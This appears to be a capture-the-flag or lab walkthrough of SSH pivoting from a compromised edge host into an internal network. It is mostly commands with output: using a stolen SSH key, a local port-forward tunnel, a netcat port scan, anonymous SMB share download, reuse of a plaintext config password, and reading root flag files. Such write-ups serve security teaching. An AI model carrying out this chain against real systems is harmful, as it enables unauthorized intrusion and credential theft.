Compromised edge host leads to internal network via SSH pivoting.

### Initial Access
```
# Gained foothold on 10.10.10.80 (edge host)
# User: www-data
# Found SSH key in /home/user/.ssh/id_rsa

# SSH as user
ssh -i id_rsa user@10.10.10.80
```

#### Identify Internal Network
```
# Check network interfaces
ip a
# eth0: 10.10.10.80
# eth1: 172.16.1.5

# Check routing
route -n
# 172.16.1.0    0.0.0.0     255.255.255.0 U 0 0 0 eth1

# Internal network discovered: 172.16.1.0/24
```

#### Setup SSH Tunnel
```
# From edge host, forward internal host's port
ssh -L 8080:172.16.1.10:80 user@localhost

# Now access internal web app
curl http://localhost:8080
# Internal server running Apache
```

#### Enumerate Internal Host
```
# Port scan internal host
for port in 21 22 80 445 3306 3389 8080; do
    nc -zv 172.16.1.10 $port 2>&1 | grep open
done
# 22/tcp open
# 80/tcp open
# 445/tcp open

# SMB share enumeration
smbclient -N -L //172.16.1.10
# Share: internal_share

# Connect to share
smbclient -N //172.16.1.10/internal_share
# downloaded config.zip
```

#### Extract Credentials from Config
```
# Unzip config
unzip config.zip
# database.config

# Contains:
# DB_HOST=172.16.1.10
# DB_USER=internal_admin
# DB_PASS=SuperSecurePass123!

# Try SSH with found credentials
ssh internal_admin@172.16.1.10
# SuperSecurePass123!
# Access granted!
```

#### Find Flags on Internal Network
```
# On internal host 172.16.1.10
find / -name "*.txt" 2>/dev/null | grep -E "flag|user|root"
# /home/internal_admin/user.txt
# /root/root.txt

cat /home/internal_admin/user.txt
# 4f7b2a9c8e1d5f6a9b2c3d4e5f6a7b8c

cat /root/root.txt
# 3f7b2a9c8e1d5f6a9b2c3d4e5f6a7b8c
```

